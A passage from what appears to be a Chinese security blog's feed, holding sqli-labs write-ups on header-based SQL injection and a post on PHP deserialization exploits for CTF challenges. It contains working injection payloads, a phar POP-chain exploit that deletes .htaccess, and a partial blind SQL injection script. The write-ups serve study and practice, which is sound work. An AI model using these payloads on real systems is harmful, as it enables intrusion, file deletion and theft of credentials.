title="Less-18"></a>Less-18</h2><p>è€ƒå¯Ÿç‚¹ï¼šHTTPå¤´éƒ¨æ³¨å…¥â€“UA</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line">$insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your User Agent is: '</span> .$uagent;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æŠ“åŒ…ä¿®æ”¹UA</span><br><span class="line">' and updatexml(1,concat('~',(database()),'~'),3) and '1'='1</span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>è€ƒå¯Ÿç‚¹ï¼šHTTPå¤´éƒ¨æ³¨å…¥â€“Referer</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="comment">//å…¶ä½™åŒLess-18</span></span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æŠ“åŒ…æ”¹Referer</span><br><span class="line">' and updatexml(1,concat('~',(database()),'~'),3) and '1'='1</span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>è€ƒå¯Ÿç‚¹ï¼šHTTPå¤´éƒ¨æ³¨å…¥â€“Cookie</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">.......</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æŠ“åŒ…æ”¹Cookie['uname']</span><br><span class="line">admin1'and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> @@basedir),<span class="number">0x7e</span>)) <span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>è€ƒå¯Ÿç‚¹ï¼šHTTPå¤´éƒ¨æ³¨å…¥â€“Cookieã€base64ç¼–ç </p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">......</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æŠ“åŒ…æ”¹Cookie['uname']</span><br><span class="line">YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$cookee1 = <span class="string">'"'</span>. $cookee. <span class="string">'"'</span>;</span><br><span class="line">.....</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//æŠ“åŒ…æ”¹Cookie['uname']</span><br><span class="line">c2tldGNoX3BsNG5lImFuZCBleHRyYWN0dmFsdWUoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è‹±è¯­ä½œæ–‡è¿˜æ²¡å†™ï¼Œwslã€‚ã€‚ã€‚</p><p>PPTè¿˜æ²¡å†™ï¼Œwslã€‚ã€‚ã€‚</p><p>æˆ‘æ„Ÿè§‰ğŸ’Š</p><p>è™½ç„¶æ˜å¤©æ»¡è¯¾(è¿˜æœ‰ä¸¤ç¯‡è‹±è¯­ä½œæ–‡awsl)ï¼Œè¿˜æ˜¯äº‰å–å†™å‡ºæ¥å…«ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åšä¸»æœ¬è´¨ï¼šæ—¥æ›´(Ã—) æ—¥å’•(âœ“)&lt;/p&gt;
&lt;p&gt;ç›®å‰è®°å½•åˆ°Less-22 :-)&lt;/p&gt;
&lt;p&gt;Creeper?&lt;/p&gt;
&lt;p&gt;Awww m
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHPååºåˆ—åŒ–æ€»ç»“</title>
    <link href="https://www.sketchplane.top/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <id>https://www.sketchplane.top/2019/10/05/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</id>
    <published>2019-10-05T01:21:37.000Z</published>
    <updated>2019-10-07T15:59:58.739Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨å…ˆçŸ¥çœ‹åˆ°<strong>Threezh1</strong>å¸ˆå‚…çš„<a href="https://xz.aliyun.com/t/6454?accounttraceid=03358f4d-fd62-479c-a546-585108ff2163#toc-2" target="_blank" rel="noopener">æ–‡ç« </a>ï¼ŒPHPååºåˆ—åŒ–çš„å§¿åŠ¿åŸºæœ¬éƒ½æœ‰æåˆ°ï¼Œæ— è®ºæ˜¯ä¹‹å‰åœ¨Pç‰›å°å¯†åœˆæœ‰æåˆ°çš„privateå’Œprotectæˆå‘˜å˜é‡ä¸å¯è§å­—ç¬¦çš„é—®é¢˜ï¼Œè¿˜æ˜¯ä¸€ç›´æƒ³å†™çš„åŸç”Ÿç±»ååºåˆ—åŒ–ï¼Œè¿˜æœ‰æ¯”è¾ƒæ„Ÿå…´è¶£çš„sessionååºåˆ—åŒ–ï¼›æ€»ä¹‹æ˜¯ä¸€ç¯‡ä¸é”™çš„PHPååºåˆ—åŒ–æ€»ç»“ï¼Œå­¦ä¹ å­¦ä¹ ï¼</p><h2 id="privateæˆå‘˜å˜é‡"><a href="#privateæˆå‘˜å˜é‡" class="headerlink" title="privateæˆå‘˜å˜é‡"></a>privateæˆå‘˜å˜é‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private_unserialize.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $args = <span class="string">"echo 'do something cool';"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> sketch_pl4ne();</span><br><span class="line">unserialize($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//private_exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $args = <span class="string">"echo 'do something cool';"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($payload);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setArgs</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;args = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;args);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> sketch_pl4ne();</span><br><span class="line">$o-&gt;setArgs();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼šè¿™é‡Œå› ä¸ºæ²¡æœ‰privateæˆå‘˜å˜é‡çš„è®¿é—®æƒé™ï¼Œä¸èƒ½ç”¨<code>-&gt;</code>è®¾ç½®å˜é‡å€¼ã€‚</strong></p><p>ç”Ÿæˆçš„payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"sketch_pl4ne"</span>:<span class="number">1</span>:&#123;s:<span class="number">18</span>:<span class="string">"sketch_pl4neargs"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ‰“ä¸€å‘å‘ç°å¹¶æ²¡æœ‰æŒ‰é¢„æœŸè¾“å‡ºæ¢é’ˆé¡µé¢ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/10/06/g9CaFN.png" alt="1.png"></p><p>åŸå› æ˜¯å­˜åœ¨ç©ºç™½å­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç±»åå·¦å³æ·»åŠ ç©ºç™½å­—ç¬¦ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"sketch_pl4ne"</span>:<span class="number">1</span>:&#123;s:<span class="number">18</span>:<span class="string">"%00sketch_pl4ne%00args"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/10/06/g9CjVe.png" alt="2.png"></p><h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p><strong>å¦‚æœæˆå‘˜å˜é‡æ˜¯privateï¼Œç±»åå·¦å³éœ€è¦æ‰‹å·¥æ·»åŠ %00ï¼Œä¹Ÿå³<code>%00className%00</code>ã€‚</strong></p><h2 id="protectedæˆå‘˜å˜é‡"><a href="#protectedæˆå‘˜å˜é‡" class="headerlink" title="protectedæˆå‘˜å˜é‡"></a>protectedæˆå‘˜å˜é‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//protected_unserialize.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $args;</span><br><span class="line">    ...</span><br><span class="line">    ç•¥</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//protected_exp.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># åŒ private å˜é‡ï¼Œç•¥</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ï¼Œæˆ‘ä»¬ç›´æ¥è¾“å…¥æ„é€ çš„<code>payload</code>æ˜¯ä¼šè¿”å›ä¸€ä¸ªååºåˆ—åŒ–é”™è¯¯çš„ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/10/06/g9R2q8.png" alt="3.png"></p><p>åŸå› ä¸privateç±»ä¼¼ï¼Œåªä¸è¿‡ä¸æ˜¯åœ¨ç±»åå·¦å³åŠ ç©ºç™½å­—ç¬¦ï¼Œ<strong>è€Œæ˜¯åœ¨å‡ºç°<code>*</code>çš„ä¸¤è¾¹åŠ ç©ºç™½å­—ç¬¦</strong>ï¼Œè¿™é‡Œ<strong>Threezh1</strong>å¸ˆå‚…è²Œä¼¼ä¹Ÿæ˜¯å†™çš„ç±»åï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—è‡ªå·±å°è¯•ä¸€ä¸‹ã€‚</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">12</span>:<span class="string">"sketch_pl4ne"</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">"%00*%00args"</span>;s:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p><strong>å¦‚æœæˆå‘˜å˜é‡æ˜¯protectedï¼Œéœ€è¦åœ¨å‡ºç°*çš„ä¸¤ä¾§æ‰‹å·¥æ·»åŠ %00ï¼Œä¹Ÿå³<code>%00\*%00</code>ã€‚</strong></p><h2 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h2><p>å…³äºä¹‹å‰å†™è¿‡ä¸€ç¯‡æ¯”è¾ƒè¯¦ç»†çš„<a href="https://www.sketchplane.top/2019/08/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%8D%E5%AD%A6%E4%B9%A0/">æ–‡ç« </a> ï¼Œæ‰€ä»¥ä¸å†å±•å¼€å†™äº†ã€‚è¿™é‡Œæƒ³è¯´çš„æ˜¯é™¤äº†æ–‡ä»¶å‡½æ•°ä¼šè§¦å‘pharååºåˆ—åŒ–ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–å‡½æ•°å› ä¸ºåº•å±‚è°ƒç”¨äº†å…³é”®å‡½æ•°ä¹Ÿå¯ä»¥è§¦å‘ååºåˆ—åŒ–ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬å’Œè¿™äº›å‡½æ•°è®¤è¯†è®¤è¯†ï¼Œä¸ç„¶å¯èƒ½æ‰¾ä¸åˆ°pharååºåˆ—åŒ–çš„åˆ©ç”¨ç‚¹ ï¼ˆæ¯”å¦‚<code>mime_content_type</code> ï¼›è¿˜æœ‰éœ€è¦çŸ¥é“ç»•è¿‡å¼€å¤´ä¸èƒ½ç”¨<code>phar://</code>çš„å‡ ä¸ªæ–¹æ³•ã€‚</p><p>ä¸‹é¢çš„ä¸€äº›æ–‡ç« æ€»ç»“å¾—æ¯”è¾ƒå…¨é¢ï¼š</p><p><a href="https://xz.aliyun.com/t/6454?accounttraceid=03358f4d-fd62-479c-a546-585108ff2163#toc-8" target="_blank" rel="noopener">PHPååºåˆ—åŒ–è¿›é˜¶å­¦ä¹ ä¸æ€»ç»“</a></p><p><a href="https://xz.aliyun.com/t/6057#toc-2" target="_blank" rel="noopener">SUCTF 2019 å‡ºé¢˜ç¬”è®° &amp; phar ååºåˆ—åŒ–çš„ä¸€äº›æ‹“å±•</a></p><p> <a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">zsxå¸ˆå‚…çš„æ–‡ç« </a></p><h2 id="åŸç”Ÿç±»åˆ©ç”¨ä¹‹-ZipArchive-open"><a href="#åŸç”Ÿç±»åˆ©ç”¨ä¹‹-ZipArchive-open" class="headerlink" title="åŸç”Ÿç±»åˆ©ç”¨ä¹‹ ZipArchive::open()"></a>åŸç”Ÿç±»åˆ©ç”¨ä¹‹ ZipArchive::open()</h2><p>æŒºæœ‰æ„æ€çš„çŸ¥è¯†ç‚¹ï¼Œphpå†…ç½®ç±»ZipArchive::open()ä¸­çš„<code>flag</code>å‚æ•°å¦‚æœè®¾ç½®ä¸º<code>ZipArchive::OVERWRITE</code>çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤ï¼Œå½“ç„¶å‰ææ˜¯å­˜åœ¨openå‡½æ•°ï¼Œ<strong>æ‰€ä»¥ä»¥åçœ‹åˆ°open()çš„è¯å¾—å¤šä¸ªå¿ƒçœ¼äº†</strong>ã€‚</p><p>ä¸‹é¢åŒæ ·ä»¥ ByteCTFçš„ EZPHPä¸ºä¾‹ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªhashé•¿åº¦æ‹“å±•ï¼Œè€å¥—è·¯äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 52107b08c0f3342d2153ae1d68e6262c</span><br><span class="line">Input Data: adminadmin</span><br><span class="line">Input Key Length: 18</span><br><span class="line">Input Data to Add: test</span><br><span class="line">bcb7fda11f22c5992de2093ed0e5a654</span><br><span class="line">adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00test</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00test</span><br><span class="line">user=bcb7fda11f22c5992de2093ed0e5a654</span><br></pre></td></tr></table></figure><p>ç”±äº <code>mime_content_type()</code>æ˜¯ä¼šè§¦å‘ååºåˆ—åŒ–çš„ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾POPé“¾äº†ï¼š</p><p><strong>å°† File::checker èµ‹å€¼ä¸º Profileå¯¹è±¡ï¼Œç”±äºä¸å­˜åœ¨upload_file()å‡½æ•°è§¦å‘__call()æ–¹æ³•ï¼Œåˆ©ç”¨ZipArchive::openåˆ é™¤æ–‡ä»¶ã€‚</strong></p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ç±»åˆ°åº•æ˜¯ä»€ä¹ˆæ ¹æ®æƒ…å†µè‡ªè¡Œä¿®æ”¹</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $filepath)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = $filepath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">"/var/www/html/sandbox/911d87b0863d6f7e544f9c938b298c66/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸å˜</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç±»çš„å±æ€§è¦æ€ä¹ˆå†™æ ¹æ®æƒ…å†µè‡ªè¡Œä¿®æ”¹</span></span><br><span class="line">$object = <span class="keyword">new</span> File(<span class="string">'filename'</span>, <span class="string">'filepath'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸å˜</span></span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p><strong>PSï¼š</strong>ç”±äº<code>filepath</code>å­˜åœ¨è¿‡æ»¤ï¼Œç”¨<code>php://filter/resource=phar://...../phar.phar</code>ç»•è¿‡å³å¯ã€‚</p><p>æœ€åè®¿é—®ä¹‹å‰ä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬å³å¯get shellã€‚</p><h2 id="åŸç”Ÿç±»åˆ©ç”¨ä¹‹-SoapClient-SSRF"><a href="#åŸç”Ÿç±»åˆ©ç”¨ä¹‹-SoapClient-SSRF" class="headerlink" title="åŸç”Ÿç±»åˆ©ç”¨ä¹‹ SoapClient SSRF"></a>åŸç”Ÿç±»åˆ©ç”¨ä¹‹ SoapClient SSRF</h2><p>è¿™ä¹Ÿæ˜¯æœ€è¿‘æ¯”è¾ƒå¸¸è§çš„ååºåˆ—åŒ–çš„ç‚¹äº†ï¼Œä¸€èˆ¬å‡ºç°åœ¨è¦æ±‚adminç™»å½•ã€å¹¶ä¸”è¦æ±‚æœ¬åœ°ç™»å½•æ—¶ï¼Œèµ°ä¸€ä¸ª<code>unserialize -&gt; CRLF -&gt; SSRF</code>çš„åˆ©ç”¨é“¾ã€‚</p><p>è¿™é‡Œä»¥ De1CTFçš„ shellshellshellä¸ºä¾‹ï¼Œæ˜ç¡®ä¸‹åˆ©ç”¨æ€è·¯ï¼š</p><p>é¦–å…ˆæ˜¯å‘ç°æ³¨å…¥ç‚¹ï¼Œå†™ä¸€ä¸ªè„šæœ¬è·‘å‡ºå¯†ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a24cf81d-16b9-45cc-9ab1-23b73378fba1.node2.buuoj.cn.wetolink.com:82/index.php?action=publish"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>: <span class="string">'4em1g9rscdc9mfvddp6nno8i17'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´é•¿åº¦</span></span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line"><span class="comment"># å­—ç¬¦é›†åˆ</span></span><br><span class="line">character = <span class="string">"abcdef1234567890"</span></span><br><span class="line"><span class="comment"># æ•°æ®åº“å</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment"># éå†æ¯ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        signature = <span class="string">"123`,(if((ascii(substr((select password from ctf_users limit 1),%d,1)))=%d,sleep(5),1)))#"</span> % (i, ord(c))</span><br><span class="line">        mood = <span class="number">0</span></span><br><span class="line">        data = &#123;<span class="string">'signature'</span>: signature, <span class="string">'mood'</span>: mood&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            s.post(url, data=data, 